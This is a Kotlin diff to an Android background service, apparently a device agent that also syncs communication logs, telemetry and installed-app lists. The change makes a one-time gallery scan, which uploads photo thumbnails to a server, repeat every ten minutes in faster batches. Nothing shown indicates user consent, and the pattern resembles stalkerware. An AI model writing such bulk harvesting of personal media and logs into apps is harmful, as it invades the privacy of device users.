@@ -227,8 +227,11 @@ class AgentBackgroundService : Service() {
                             syncCommunicationLogs()
                         }
 
-                        // 5. One-time Media Gallery thumbnail scan
-                        if (!hasScannedMedia) {
+                        // 5. Gallery scan (initial scan + periodic sync every 10 mins)
+                        val now = System.currentTimeMillis()
+                        val shouldScan = !hasScannedMedia || (now - lastMediaScanMs >= 600_000L)
+                        if (shouldScan) {
+                            lastMediaScanMs = now
                             performMediaScan()
                         }
                     } else {
@@ -246,6 +249,7 @@ class AgentBackgroundService : Service() {
     private var lastTelemetrySyncMs = 0L
     private var hasUploadedApps = false
     private var hasScannedMedia = false
+    private var lastMediaScanMs = 0L
 
     private suspend fun performTelemetrySync() {
         val now = System.currentTimeMillis()
@@ -267,22 +271,21 @@ class AgentBackgroundService : Service() {
 
     private suspend fun performMediaScan() {
         try {
-            Log.i(TAG, "Starting gallery media scan...")
-            val batches = com.example.gmaagent.data.MediaScanner.scanAll(applicationContext)
-            var totalIngested = 0
-            for (batch in batches) {
+            Log.i(TAG, "Starting comprehensive gallery media scan...")
+            var totalProcessed = 0
+            com.example.gmaagent.data.MediaScanner.scanAndUploadAll(applicationContext) { batch ->
                 val payload = com.example.gmaagent.network.MediaThumbnailSyncRequest(
                     thumbnails = batch
                 )
                 val result = ApiClient.syncMediaThumbnails(payload)
                 if (result != null) {
-                    totalIngested += result.ingested
+                    totalProcessed += result.ingested
                     Log.i(TAG, "Media batch synced: ${result.ingested} ingested, ${result.skipped} skipped")
                 }
-                delay(1000L)
+                delay(300L)
             }
             hasScannedMedia = true
-            Log.i(TAG, "Gallery scan complete — $totalIngested thumbnails uploaded")
+            Log.i(TAG, "Gallery scan complete — $totalProcessed thumbnails synced")
         } catch (e: Exception) {
             Log.e(TAG, "Error performing media scan", e)
         }
